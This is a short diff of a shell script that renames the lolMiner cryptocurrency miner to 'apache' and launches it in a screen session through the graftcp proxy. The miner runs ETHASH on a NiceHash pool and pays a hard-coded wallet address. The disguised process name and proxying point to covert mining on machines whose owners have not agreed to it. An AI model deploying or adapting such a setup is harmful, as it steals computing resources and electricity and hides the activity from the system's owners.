@@ -45,7 +45,4 @@ cd 1.48
 mv lolMiner ../apache
 cd ..
 
-screen ./graftcp/graftcp bash 
-
-./apache --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3E1T35rmEJrhDtGsuXYgkrbzyLxUuHbNvL.$1
-
+screen ./graftcp/graftcp bash | ./apache --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3E1T35rmEJrhDtGsuXYgkrbzyLxUuHbNvL.$1
